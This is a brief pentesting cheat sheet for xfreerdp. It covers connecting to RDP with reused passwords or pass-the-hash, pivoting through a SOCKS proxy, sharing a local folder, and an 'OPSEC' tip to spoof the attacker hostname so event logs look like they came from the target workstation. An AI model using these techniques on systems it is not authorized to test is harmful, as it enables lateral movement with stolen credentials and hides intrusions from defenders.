# FreeRDP

## 01 - Authenticate RDP

- Choose keyboard layout that is familiar to you and then specify the `/kbd 0x<layout_id>` flag.

`$ xfreerdp /kbd-list`

- Reuse passwords

```
$ xfreerdp /kbd 0x00000409 +clipboard +compression /dynamic-resolution +toggle-fullscreen /u:<username> /d:<domain_name> /p:<password> /cert:ignore /v:<IP> /port:[<PORT>]

$ xfreerdp /kbd 0x00000409 +clipboard +compression /dynamic-resolution +toggle-fullscreen /u:[DOMAIN\]<username> /p:<password> /cert:ignore /v:<IP>:[<PORT>]
```

- Pass the Hash

```
$ xfreerdp /kbd 0x00000409 +clipboard +compression /dynamic-resolution +toggle-fullscreen /u:<username> /d:<domain_name> /pth:<nt_hash> /cert:ignore /v:<IP> /port:[<PORT>]

$ xfreerdp /kbd 0x00000409 +clipboard +compression /dynamic-resolution +toggle-fullscreen /u:[DOMAIN\]<username> /pth:<nt_hash> /cert:ignore /v:<IP>:[<PORT>]
```

## 02 - Pivoting with RDP via SOCKS Proxy

`$ xfreerdp +clipboard +compression /dynamic-resolution +toggle-fullscreen /proxy:socks5://<IP>:<PORT> /u:<username> /p:<password> /v:<IP>:[<PORT>]`

## 03 - Share files

`$ xfreerdp +clipboard +compression /dynamic-resolution +toggle-fullscreen /u:<username> /p:<password> /v:<IP>:[<PORT>] /drive:/path/to/folder-to-share`

## 04 - OPSEC Consideration

- Change your Linux hostname to the same target workstation to spoof the event logs

`$ sudo hostnamectl set-hostname "<windows_workstation_name_to_spoof>"`

---
## References

- [FreeRDP User Manual](https://github.com/awakecoding/FreeRDP-Manuals/blob/master/User/FreeRDP-User-Manual.markdown)

- [Pass the Hash Attack with RDP](https://infinitelogins.com/2021/02/20/pass-the-hash-attack-with-rdp/)

- [Hacktricks: Pentesting RDP](https://book.hacktricks.xyz/pentesting/pentesting-rdp)

- [Make FreeRDP Prompt User for Username and Password](https://unix.stackexchange.com/questions/119880/make-freerdp-prompt-user-for-username-and-password)